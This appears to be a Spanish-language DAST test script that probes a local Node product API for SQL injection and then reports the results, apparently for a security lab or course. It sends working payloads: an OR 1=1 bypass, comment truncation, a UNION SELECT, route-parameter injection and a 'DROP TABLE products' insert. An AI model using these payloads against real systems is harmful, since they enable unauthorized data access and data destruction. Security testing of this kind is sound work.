import requests
import json
import time
from datetime import datetime

# Colores para terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_header(text):
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}{text}{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")

def print_test(number, description):
    print(f"{Colors.YELLOW}[Test {number}] {description}{Colors.END}")

def print_success(text):
    print(f"{Colors.GREEN}✓ {text}{Colors.END}")

def print_warning(text):
    print(f"{Colors.YELLOW}⚠ {text}{Colors.END}")

def print_error(text):
    print(f"{Colors.RED}✗ {text}{Colors.END}")

def print_vulnerable(text):
    print(f"{Colors.RED}{Colors.BOLD}🚨 VULNERABLE: {text}{Colors.END}")

BASE_URL = "http://localhost:3000"
results = []

def check_server():
    """Verifica si el servidor está corriendo"""
    print_test("0", "Verificando servidor...")
    try:
        response = requests.get(f"{BASE_URL}/health", timeout=5)
        if response.status_code == 200:
            print_success(f"Servidor activo en {BASE_URL}")
            return True
    except requests.exceptions.ConnectionError:
        print_error(f"Servidor no está corriendo en {BASE_URL}")
        print("\nPor favor ejecuta en otra terminal:")
        print("  npm start")
        return False
    except Exception as e:
        print_error(f"Error al conectar: {e}")
        return False

def test_normal_search():
    """Test 1: Búsqueda normal (baseline)"""
    print_test("1", "Búsqueda normal (baseline)")
    
    url = f"{BASE_URL}/api/products/search?name=laptop"
    response = requests.get(url)
    data = response.json()
    
    count = data.get('count', 0)
    print(f"   URL: {url}")
    print(f"   Resultados: {count} productos")
    
    results.append({
        'test': 'Búsqueda normal',
        'url': url,
        'vulnerable': False,
        'count': count,
        'severity': 'INFO'
    })
    
    return count

def test_sqli_bypass():
    """Test 2: SQL Injection - Bypass con OR 1=1"""
    print_test("2", "SQL Injection - Bypass (OR 1=1)")
    
    payload = "' OR '1'='1"
    url = f"{BASE_URL}/api/products/search?name={requests.utils.quote(payload)}"
    
    try:
        response = requests.get(url)
        data = response.json()
        count = data.get('count', 0)
        
        print(f"   Payload: {payload}")
        print(f"   URL: {url}")
        print(f"   Resultados: {count} productos")
        
        if count >= 20:
            print_vulnerable(f"Bypass exitoso - Acceso a {count} registros")
            results.append({
                'test': 'SQL Injection Bypass',
                'url': url,
                'payload': payload,
                'vulnerable': True,
                'count': count,
                'severity': 'CRITICAL',
                'description': 'Permite bypass de condiciones WHERE'
            })
            return True
        else:
            print_warning("No se pudo confirmar bypass")
            return False
            
    except Exception as e:
        print_error(f"Error: {e}")
        return False

def test_sqli_comment():
    """Test 3: SQL Injection - Comentario SQL"""
    print_test("3", "SQL Injection - Comentario (--)")
    
    payload = "laptop'--"
    url = f"{BASE_URL}/api/products/search?name={requests.utils.quote(payload)}"
    
    try:
        response = requests.get(url)
        data = response.json()
        
        print(f"   Payload: {payload}")
        print(f"   URL: {url}")
        
        if data.get('success'):
            print_vulnerable("Comentario SQL procesado - Query modificada")
            results.append({
                'test': 'SQL Injection Comment',
                'url': url,
                'payload': payload,
                'vulnerable': True,
                'severity': 'HIGH',
                'description': 'Permite comentar resto de la query'
            })
            return True
        else:
            print_warning("No se pudo confirmar")
            return False
            
    except Exception as e:
        print_error(f"Error: {e}")
        return False

def test_sqli_union():
    """Test 4: SQL Injection - UNION attack"""
    print_test("4", "SQL Injection - UNION attack")
    
    payload = "' UNION SELECT null,null,null,null,null--"
    url = f"{BASE_URL}/api/products/search?name={requests.utils.quote(payload)}"
    
    try:
        response = requests.get(url)
        data = response.json()
        
        print(f"   Payload: {payload}")
        print(f"   URL: {url}")
        print(f"   Status: {response.status_code}")
        
        if not data.get('success') or 'error' in data:
            error_msg = data.get('error', '')
            if 'SQL' in error_msg or 'UNION' in error_msg:
                print_vulnerable("Error SQL expuesto - Confirma inyección")
                results.append({
                    'test': 'SQL Injection UNION',
                    'url': url,
                    'payload': payload,
                    'vulnerable': True,
                    'severity': 'CRITICAL',
                    'description': 'Permite UNION attacks, expone errores SQL'
                })
                return True
        
        print_warning("No se pudo confirmar UNION attack")
        return False
            
    except Exception as e:
        print_error(f"Error: {e}")
        return False

def test_sqli_parameter_id():
    """Test 5: SQL Injection en parámetro ID"""
    print_test("5", "SQL Injection en parámetro :id")
    
    payload = "1 OR 1=1"
    url = f"{BASE_URL}/api/products/{requests.utils.quote(payload)}"
    
    try:
        response = requests.get(url)
        data = response.json()
        
        print(f"   Payload: {payload}")
        print(f"   URL: {url}")
        
        if data.get('success') and data.get('data'):
            print_vulnerable("Inyección en parámetro de ruta exitosa")
            results.append({
                'test': 'SQL Injection en ID',
                'url': url,
                'payload': payload,
                'vulnerable': True,
                'severity': 'CRITICAL',
                'description': 'Parámetro de ruta vulnerable'
            })
            return True
        else:
            print_warning("No se pudo confirmar")
            return False
            
    except Exception as e:
        print_error(f"Error: {e}")
        return False

def test_sqli_post():
    """Test 6: SQL Injection en POST (CREATE)"""
    print_test("6", "SQL Injection en POST request")
    
    payload = {
        "name": "Test'); DROP TABLE products--",
        "price": 99.99,
        "category": "Test",
        "stock": 10
    }
    url = f"{BASE_URL}/api/products"
    
    try:
        response = requests.post(url, json=payload)
        data = response.json()
        
        print(f"   Payload: {payload['name']}")
        print(f"   URL: {url}")
        
        if 'error' in data or data.get('success'):
            print_vulnerable("Payload malicioso procesado en INSERT")
            results.append({
                'test': 'SQL Injection en POST',
                'url': url,
                'payload': payload['name'],
                'vulnerable': True,
                'severity': 'CRITICAL',
                'description': 'INSERT query vulnerable a inyección'
            })
            return True
        else:
            print_warning("No se pudo confirmar")
            return False
            
    except Exception as e:
        print_error(f"Error: {e}")
        return False

def test_information_disclosure():
    """Test 7: Information Disclosure"""
    print_test("7", "Information Disclosure (Exposición de errores)")
    
    payload = "invalid' syntax"
    url = f"{BASE_URL}/api/products/search?name={requests.utils.quote(payload)}"
    
    try:
        response = requests.get(url)
        data = response.json()
        
        print(f"   Payload: {payload}")
        print(f"   URL: {url}")
        
        if 'stack' in data or 'SQLite' in str(data):
            print_vulnerable("Información sensible expuesta en errores")
            results.append({
                'test': 'Information Disclosure',
                'url': url,
                'payload': payload,
                'vulnerable': True,
                'severity': 'MEDIUM',
                'description': 'Expone stack traces y errores SQL'
            })
            return True
        else:
            print_warning("No se detectó exposición de información")
            return False
            
    except Exception as e:
        print_error(f"Error: {e}")
        return False

def generate_report():
    """Genera reporte final"""
    print_header("RESUMEN DE RESULTADOS")
    
    total_tests = len(results)
    vulnerabilities = [r for r in results if r.get('vulnerable')]
    critical = [r for r in vulnerabilities if r.get('severity') == 'CRITICAL']
    high = [r for r in vulnerabilities if r.get('severity') == 'HIGH']
    medium = [r for r in vulnerabilities if r.get('severity') == 'MEDIUM']
    
    print(f"Total de pruebas: {total_tests}")
    print(f"Vulnerabilidades encontradas: {len(vulnerabilities)}")
    print(f"  - Críticas: {len(critical)}")
    print(f"  - Altas: {len(high)}")
    print(f"  - Medias: {len(medium)}")
    print()
    
    if vulnerabilities:
        print_header("VULNERABILIDADES DETECTADAS")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"\n{i}. {vuln['test']}")
            print(f"   Severidad: {vuln['severity']}")
            print(f"   Descripción: {vuln.get('description', 'N/A')}")
            print(f"   Payload: {vuln.get('payload', 'N/A')}")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_file = f"dast-results.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'timestamp': timestamp,
            'target': BASE_URL,
            'total_tests': total_tests,
            'vulnerabilities': len(vulnerabilities),
            'results': results
        }, f, indent=2)
    
    print(f"\n{Colors.GREEN}✓ Resultados guardados en: {json_file}{Colors.END}")
    
    txt_file = "dast-results.txt"
    with open(txt_file, 'w', encoding='utf-8') as f:
        f.write("ANÁLISIS DAST - SQL INJECTION TESTING\n")
        f.write("="*70 + "\n\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Target: {BASE_URL}\n")
        f.write(f"Total de pruebas: {total_tests}\n")
        f.write(f"Vulnerabilidades: {len(vulnerabilities)}\n\n")
        
        if vulnerabilities:
            f.write("VULNERABILIDADES DETECTADAS:\n")
            f.write("="*70 + "\n\n")
            for i, vuln in enumerate(vulnerabilities, 1):
                f.write(f"{i}. {vuln['test']}\n")
                f.write(f"   Severidad: {vuln['severity']}\n")
                f.write(f"   Descripción: {vuln.get('description', 'N/A')}\n")
                f.write(f"   Payload: {vuln.get('payload', 'N/A')}\n")
                f.write(f"   URL: {vuln.get('url', 'N/A')}\n\n")
    
    print(f"{Colors.GREEN}✓ Resultados guardados en: {txt_file}{Colors.END}")
    
    print_header("CONCLUSIÓN")
    if len(critical) > 0:
        print(f"{Colors.RED}{Colors.BOLD}⚠ CRÍTICO: Se encontraron {len(critical)} vulnerabilidades críticas{Colors.END}")
        print(f"{Colors.RED}La aplicación es VULNERABLE a SQL Injection{Colors.END}")
        print("\n✓ Permite bypass de condiciones (OR 1=1)")
        print("✓ Permite ver todos los datos sin autorización")
        print("✓ Concatena strings directamente en SQL")
        print("✓ No usa prepared statements")
    else:
        print(f"{Colors.GREEN}✓ No se encontraron vulnerabilidades críticas{Colors.END}")

def main():
    print_header("ANÁLISIS DAST - SQL INJECTION TESTING")
    print(f"Target: {BASE_URL}")
    print(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    if not check_server():
        return
    
    print()
    time.sleep(1)
    
    # Ejecutar pruebas
    baseline = test_normal_search()
    time.sleep(0.5)
    
    test_sqli_bypass()
    time.sleep(0.5)
    
    test_sqli_comment()
    time.sleep(0.5)
    
    test_sqli_union()
    time.sleep(0.5)
    
    test_sqli_parameter_id()
    time.sleep(0.5)
    
    test_sqli_post()
    time.sleep(0.5)
    
    test_information_disclosure()
    time.sleep(0.5)
    
    generate_report()
    
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}Análisis completado{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Análisis interrumpido por el usuario{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}Error fatal: {e}{Colors.END}")